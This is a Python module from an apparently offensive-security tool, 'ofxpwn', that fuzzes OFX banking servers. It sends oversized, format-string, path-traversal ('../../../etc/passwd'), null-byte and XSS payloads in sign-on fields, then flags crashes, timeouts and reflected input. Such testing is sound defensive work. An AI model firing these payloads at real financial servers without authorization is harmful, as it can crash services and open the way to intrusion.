"""
Field Overflow and Fuzzing Module

Tests OFX fields with oversized, malformed, and edge-case inputs.
"""

from typing import Dict, Any, List
import time
import string

from ofxpwn.core.base_module import BaseModule
from ofxpwn.core.config import Config
from ofxpwn.core.logger import Logger
from ofxpwn.core.protocol import OFXRequest
from ofxpwn.core.sender import OFXSender


class FieldsFuzzModule(BaseModule):
    """Field overflow and edge case testing"""

    @classmethod
    def get_description(cls) -> str:
        return "Test OFX fields with oversized and malformed inputs"

    def run(self, config: Config, logger: Logger) -> Dict[str, Any]:
        """Run field fuzzing"""
        self.config = config
        self.logger = logger

        logger.info("="*60)
        logger.info("OFX Field Fuzzing")
        logger.info("="*60)
        logger.warning("Testing fields with edge cases and overflow...")

        ofx = OFXRequest(
            org=config.get_target_org(),
            fid=config.get_target_fid()
        )
        sender = OFXSender(config, logger)

        results = {
            'tests_run': 0,
            'crashes': [],
            'errors': [],
            'interesting': []
        }

        # Field test cases
        test_cases = [
            # Buffer overflows
            {
                'name': 'Very long username (1000 chars)',
                'field': 'userid',
                'value': 'A' * 1000,
                'severity': 'HIGH'
            },
            {
                'name': 'Very long username (10000 chars)',
                'field': 'userid',
                'value': 'A' * 10000,
                'severity': 'HIGH'
            },
            {
                'name': 'Very long password (1000 chars)',
                'field': 'userpass',
                'value': 'B' * 1000,
                'severity': 'HIGH'
            },
            {
                'name': 'Very long ORG (500 chars)',
                'field': 'org',
                'value': 'C' * 500,
                'severity': 'MEDIUM'
            },
            {
                'name': 'Very long FID (500 chars)',
                'field': 'fid',
                'value': 'D' * 500,
                'severity': 'MEDIUM'
            },
            {
                'name': 'Very long CLIENTUID (1000 chars)',
                'field': 'clientuid',
                'value': 'E' * 1000,
                'severity': 'MEDIUM'
            },

            # Format string attacks
            {
                'name': 'Format string in username',
                'field': 'userid',
                'value': '%s%s%s%s%s%s%s%s%s%s',
                'severity': 'HIGH'
            },
            {
                'name': 'Format string in password',
                'field': 'userpass',
                'value': '%n%n%n%n%n',
                'severity': 'HIGH'
            },

            # Special characters
            {
                'name': 'Null bytes in username',
                'field': 'userid',
                'value': 'admin\x00test',
                'severity': 'MEDIUM'
            },
            {
                'name': 'Unicode characters',
                'field': 'userid',
                'value': '\u0000\u0001\u0002\u0003',
                'severity': 'LOW'
            },
            {
                'name': 'High ASCII characters',
                'field': 'userid',
                'value': '\xff\xfe\xfd\xfc',
                'severity': 'LOW'
            },

            # Control characters
            {
                'name': 'Newlines in username',
                'field': 'userid',
                'value': 'admin\n\r\n',
                'severity': 'LOW'
            },
            {
                'name': 'Tabs in username',
                'field': 'userid',
                'value': 'admin\t\t\t',
                'severity': 'LOW'
            },

            # Path traversal
            {
                'name': 'Path traversal in username',
                'field': 'userid',
                'value': '../../../etc/passwd',
                'severity': 'MEDIUM'
            },
            {
                'name': 'Windows path traversal',
                'field': 'userid',
                'value': '..\\..\\..\\windows\\system32',
                'severity': 'MEDIUM'
            },

            # Numeric edge cases
            {
                'name': 'Negative FID',
                'field': 'fid',
                'value': '-1',
                'severity': 'LOW'
            },
            {
                'name': 'Very large FID',
                'field': 'fid',
                'value': '999999999999999999',
                'severity': 'LOW'
            },
            {
                'name': 'Zero FID',
                'field': 'fid',
                'value': '0',
                'severity': 'LOW'
            },

            # Script injection
            {
                'name': 'Script tag in username',
                'field': 'userid',
                'value': '<script>alert(1)</script>',
                'severity': 'MEDIUM'
            },
            {
                'name': 'HTML in username',
                'field': 'userid',
                'value': '<img src=x onerror=alert(1)>',
                'severity': 'MEDIUM'
            },

            # Empty/whitespace
            {
                'name': 'Empty username',
                'field': 'userid',
                'value': '',
                'severity': 'LOW'
            },
            {
                'name': 'Whitespace-only username',
                'field': 'userid',
                'value': '     ',
                'severity': 'LOW'
            },
        ]

        for test_case in test_cases:
            logger.info(f"\nTesting: {test_case['name']}")

            # Build request based on field being tested
            request_body = ofx.build_sgml_header() + "<OFX>\n"

            field = test_case['field']
            value = test_case['value']

            if field == 'userid':
                request_body += ofx.build_signon_sgml(value, 'test')
            elif field == 'userpass':
                request_body += ofx.build_signon_sgml('test', value)
            elif field == 'org':
                # Override org for this request
                custom_ofx = OFXRequest(org=value, fid=config.get_target_fid())
                request_body = custom_ofx.build_sgml_header() + "<OFX>\n"
                request_body += custom_ofx.build_signon_sgml('test', 'test')
            elif field == 'fid':
                # Override fid for this request
                custom_ofx = OFXRequest(org=config.get_target_org(), fid=value)
                request_body = custom_ofx.build_sgml_header() + "<OFX>\n"
                request_body += custom_ofx.build_signon_sgml('test', 'test')
            elif field == 'clientuid':
                request_body += ofx.build_signon_sgml('test', 'test', clientuid=value)
            else:
                request_body += ofx.build_signon_sgml('test', 'test')

            request_body += "</OFX>\n"

            start_time = time.time()
            result = sender.send_request(
                request_body,
                save_name=f"fuzz_{test_case['name'].replace(' ', '_').lower()}"
            )
            elapsed = time.time() - start_time

            results['tests_run'] += 1

            if not result.get('success'):
                error = result.get('error', 'unknown')

                if 'timeout' in error.lower():
                    logger.finding(
                        'HIGH',
                        'Parser Timeout/Hang',
                        f'Timeout with: {test_case["name"]}',
                        f'Field {field} may cause parser hang with oversized input'
                    )
                    results['crashes'].append({
                        'test': test_case['name'],
                        'field': field,
                        'type': 'timeout'
                    })
                elif 'connection' in error.lower():
                    logger.finding(
                        'CRITICAL',
                        'Server Connection Lost',
                        f'Connection lost with: {test_case["name"]}',
                        f'Field {field} may have crashed the server'
                    )
                    results['crashes'].append({
                        'test': test_case['name'],
                        'field': field,
                        'type': 'connection_lost'
                    })
                else:
                    logger.warning(f"  Request failed: {error}")
                    results['errors'].append({
                        'test': test_case['name'],
                        'error': error
                    })

                time.sleep(1)  # Wait before next test if error
                continue

            http_status = result.get('http_status')
            ofx_status = result.get('ofx_status')
            response_text = result.get('response_text', '')

            logger.info(f"  HTTP: {http_status}, OFX: {ofx_status}, Time: {elapsed:.2f}s")

            # Check for crashes/500 errors
            if http_status == 500:
                logger.finding(
                    test_case['severity'],
                    'Server Error on Malformed Field',
                    f'HTTP 500 with: {test_case["name"]}',
                    f'Field {field} causes server error with value: {value[:50]}'
                )
                results['crashes'].append({
                    'test': test_case['name'],
                    'field': field,
                    'http_status': 500
                })

            # Check for interesting error messages
            error_keywords = ['error', 'exception', 'stack trace', 'debug', 'warning']
            if any(keyword in response_text.lower() for keyword in error_keywords):
                logger.warning(f"  Error message in response")
                results['interesting'].append({
                    'test': test_case['name'],
                    'field': field,
                    'reason': 'error_message_disclosure'
                })

            # Check for reflected input (possible XSS)
            if value in response_text:
                logger.info(f"  Input reflected in response")
                results['interesting'].append({
                    'test': test_case['name'],
                    'field': field,
                    'reason': 'input_reflection'
                })

            # Check for timing anomalies
            if elapsed > 5:
                logger.warning(f"  Slow response: {elapsed:.2f}s")
                results['interesting'].append({
                    'test': test_case['name'],
                    'field': field,
                    'reason': 'timing_anomaly',
                    'elapsed': elapsed
                })

            time.sleep(0.3)

        # Summary
        logger.info("\n" + "="*60)
        logger.info("Field Fuzzing Summary")
        logger.info("="*60)
        logger.info(f"Tests run: {results['tests_run']}")
        logger.info(f"Crashes/500 errors: {len(results['crashes'])}")
        logger.info(f"Request errors: {len(results['errors'])}")
        logger.info(f"Interesting responses: {len(results['interesting'])}")

        if results['crashes']:
            logger.warning("Field overflow/fuzzing caused server errors!")
            logger.warning("Review findings for potential vulnerabilities")
        else:
            logger.success("Server handled malformed fields without crashing")

        return results
